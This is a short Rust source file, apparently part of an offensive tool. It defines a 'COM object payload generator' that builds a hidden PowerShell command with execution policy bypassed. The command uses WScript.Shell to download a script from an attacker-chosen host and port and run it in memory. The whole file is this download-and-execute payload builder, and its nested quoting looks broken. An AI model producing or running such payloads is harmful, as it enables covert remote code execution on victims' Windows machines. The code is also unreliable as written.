// Windows COM object payload generator
use crate::cli::banner;

pub struct ComObjGenerator;

impl ComObjGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("COM-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        format!(
            "powershell -w hidden -exec bypass -c \"$c = New-Object -ComObject WScript.Shell;$c.Run('IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/payload.ps1')', 0)\"",
            lhost, lport
        )
    }
}
